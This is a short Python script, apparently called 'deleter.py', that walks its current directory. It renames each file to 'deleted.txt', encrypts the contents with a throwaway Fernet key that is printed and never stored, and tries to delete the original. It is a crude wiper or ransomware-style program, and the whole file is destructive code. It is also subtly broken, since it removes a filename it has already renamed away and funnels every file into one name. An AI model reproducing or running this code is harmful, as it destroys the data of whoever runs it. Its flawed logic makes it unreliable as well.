# import pip
# pip.main(['install','cryptography'])
import cryptography
import os
from cryptography.fernet import Fernet

cipher_key = Fernet.generate_key()
print(cipher_key)
cipher = Fernet(cipher_key)
for filename in os.listdir():
    if os.path.isfile(filename) and filename != 'deleter.py':
        os.rename(filename, 'deleted.txt')
        file = open("deleted.txt", "rb+")
        text = file.read()
        encrypted_text = cipher.encrypt(text)
        print(encrypted_text)
        decrypted_text = cipher.decrypt(encrypted_text)
        file.seek(0)
        file.write(encrypted_text)
# print(decrypted_text)
        file.close()
        os.remove(filename)
# file1 = open('decrypted_tux.txt', "rb+")
# file1.seek(0)
# file1.write(decrypted_text)
# file1.close()
